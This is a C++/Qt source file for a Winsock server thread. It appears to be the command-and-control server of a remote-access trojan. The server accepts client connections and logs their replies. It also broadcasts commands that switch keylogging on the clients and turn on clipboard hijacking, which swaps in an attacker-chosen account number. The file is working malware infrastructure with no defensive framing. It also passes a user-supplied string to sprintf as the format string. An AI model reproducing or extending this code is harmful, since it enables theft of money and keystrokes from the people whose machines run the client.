#include "serverthread.h"
#include <winsock2.h>

#include <process.h>
#include <iostream>
#include "tchar.h"
#include <QDebug>
#include <QMutex>
#include "serverandclient.h"
#include <vector>

serverThread::serverThread(QObject *parent, bool stopThread, bool stopOnlyClientsIn):
    QThread(parent), Stop(stopThread), stopOnlyClients(stopOnlyClientsIn)
{
    this->needToSendAgain = "";
    this->newCommand = "";
    this->needToChangeAccountNumber = false;
    this->needToSendKeylogger = false;
    this->oldNeedToSendKeylogger = false;
    this->oldNeedToChangeAccountNumber = false;
    this->accountNumberToChange = "";
}

std::string serverThread::convertToString(char* a, int size)
{
    int i;
    std::string s = "";
    for (i = 0; i < size; i++) {
        s = s + a[i];
    }
    return s;
}


void serverThread::onChangeCountOfClientsOnServer(int count){
    emit changeCountOfClients(count);
}

void serverThread::onAppendConsoleLogClientServer(std::string from, std::string what){
    emit appendConsoleLog(from, what);
}

void serverThread::onLastCommandChangeValue(std::string command){
    emit lastCommandChangeValue(command);
}

void serverThread::onSendMessageToClient(int clientId, char* text){
    onAppendConsoleLogClientServer(std::to_string(clientId),convertToString(text, 200 / sizeof(char)));
    this->clientServerThreads.at(clientId)->iResult = send(this->clientSockets.at(clientId), text, 200, 0);
    for(int i = 0;i < 200; i++){
      text[i] = '\0';
    }
    sprintf(text, "");
    this->clientServerThreads.at(clientId)->canContinue = true;
}

void serverThread::onCloseClientSocket(int clientId){
    closesocket(this->clientSockets.at(clientId));
}

void serverThread::onRecieveBufferMessageFromClient(int clientId){
    char chunk[200] = "";
    std::string toSendStr = "";
    std::string toRecvStr = "";
    this->clientServerThreads.at(clientId)->iResult = recv(this->clientSockets.at(clientId), chunk, 200, 0);
    if ( this->clientServerThreads.at(clientId)->iResult > 0 ){
        toRecvStr = convertToString(chunk, sizeof(chunk) / sizeof(char));
        toRecvStr = toRecvStr.substr(0, toRecvStr.find('\0'));
        onAppendConsoleLogClientServer("Client, id: " + std::to_string(clientId), toRecvStr);
    }
    else if ( this->clientServerThreads.at(clientId)->iResult == 0 ){
        printf("Connection closed\n");
        this->clientServerThreads.at(clientId)->Stop = true;
    }
    else{
        printf("recv failed: %d\n", WSAGetLastError());
        return;
    }
}

std::string serverThread::onLastCommandGetValue(){
    return emit lastCommandGetValue();
}

void serverThread::run(){
    WSADATA wsaData;
    int iResult;
    sockaddr_in addr;
    SOCKET sock,client;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(2222);
    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

    iResult = WSAStartup(MAKEWORD(2,2),&wsaData);//2.2

    QMutex mutex;
    if(iResult)
    {
        printf("WSA startup failed");
        return;
    }
    emit changeProgressBarValue(25);
    sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(sock == INVALID_SOCKET)
    {
        emit changeProgressBarValue(0);
        printf("Invalid socket");
        return;
    }
    emit changeProgressBarValue(50);
    iResult = bind(sock,(sockaddr*)&addr,sizeof(sockaddr_in ));
    if(iResult)
    {
        emit changeProgressBarValue(0);
        printf("bind failed %lu",GetLastError());

        return;
    }
    emit changeProgressBarValue(75);
    iResult = listen(sock,SOMAXCONN);
    if(iResult)
    {
        emit changeProgressBarValue(0);
        printf("iResult failed %lu",GetLastError());
        return;
    }
//    qDebug() << "Waiting for clients at:" << "127.0.0.1:2222";
    int count_of_clients = 0;
    int clientId = 0;
    fd_set readfds;
    struct timeval tv;
    int result;
    emit changeProgressBarValue(100);

    emit appendConsoleLog("Server", "waiting for clients at 127.0.0.1:2222");
    while(!this->Stop)
    {

        FD_ZERO(&readfds);
        tv.tv_sec = 1; // number of seconds to wait here
        tv.tv_usec = 1;
        FD_SET(sock, &readfds);
        result = select(sock + 1, &readfds, NULL, NULL, &tv);
        if (result > 0){
            client = accept(sock, 0, 0);
            if(client == INVALID_SOCKET)
            {
//                printf("invalid client socket: %lu",GetLastError());
                continue;
            }
            clientSockets.push_back(client);
            serverAndClient *newClientServerThread = new serverAndClient(this, clientId, count_of_clients);
            this->clientServerThreads.push_back(newClientServerThread);
            // connect signal/slot
            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(changeCountOfClientsOnServer(int)), this, SLOT(onChangeCountOfClientsOnServer(int)));
            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(appendConsoleLogClientServer(std::string,std::string)), this, SLOT(onAppendConsoleLogClientServer(std::string,std::string)));

            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(closeClientSocket(int)), this, SLOT(onCloseClientSocket(int)));
            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(recieveBufferMessageFromClient(int)), this, SLOT(onRecieveBufferMessageFromClient(int)));
            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(sendMessageToClient(int, char*)), this, SLOT(onSendMessageToClient(int, char*)));
            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(lastCommandChangeValue(std::string)), this, SLOT(onLastCommandChangeValue(std::string)));

            connect(this->clientServerThreads.at(count_of_clients), SIGNAL(lastCommandGetValue()), this, SLOT(onLastCommandGetValue()));

            this->clientServerThreads.at(count_of_clients)->start();
            emit changeCountOfClients(1);
            count_of_clients++;
            clientId++;
        }
        else{
            if(this->Stop){
                for(int i = 0; i < count_of_clients; i++){
                    this->clientServerThreads.at(i)->Stop = true;
                }
                if(this->stopOnlyClients){
                    this->Stop = false;
                }
                this->stopOnlyClients = false;
            }
            else if(this->needToSendAgain != ""){
                for(int i = 0; i < count_of_clients; i++){
                    this->clientServerThreads.at(i)->needToSendAgain = this->needToSendAgain;
                }
                this->needToSendAgain = "";
            }
            else if(this->newCommand != ""){
                for(int i = 0; i < count_of_clients; i++){
                    this->clientServerThreads.at(i)->newCommand = this->newCommand;
                }
                this->newCommand = "";
            }
            else if(this->oldNeedToChangeAccountNumber != this->needToChangeAccountNumber){
                for(int i = 0; i < count_of_clients; i++){
                    char ptr_to_send[200] = "";
                    if(this->needToChangeAccountNumber){
                        sprintf(ptr_to_send, "clipboardAutoChangeTrue");
                        onSendMessageToClient(i, ptr_to_send);
                        this->accountNumberToChange += '\0';
                        sprintf(ptr_to_send,this->accountNumberToChange.c_str());
                        onSendMessageToClient(i, ptr_to_send);
                    }
                    else{
                        sprintf(ptr_to_send, "clipboardAutoChangeFalse");
                      onSendMessageToClient(i, ptr_to_send);
                    }
                }
                this->oldNeedToChangeAccountNumber = this->needToChangeAccountNumber;
            }
            else if(this->oldNeedToSendKeylogger != this->needToSendKeylogger){
                for(int i = 0; i < count_of_clients; i++){
                    char ptr_to_send[200] = "";
                    if(this->needToSendKeylogger){
                        sprintf(ptr_to_send, "keyLoggerOn");
                       onSendMessageToClient(i, ptr_to_send);
                    }
                    else{
                         sprintf(ptr_to_send, "keyLoggerOff");
                       onSendMessageToClient(i, ptr_to_send);
                    }
                }
                this->oldNeedToSendKeylogger = this->needToSendKeylogger;
            }
        }
    }
    emit appendConsoleLog("Server", "is down");
    closesocket(sock);
    this->Stop = false;
    this->stopOnlyClients = false;
    return;
}





serverThread::~serverThread()
{

}
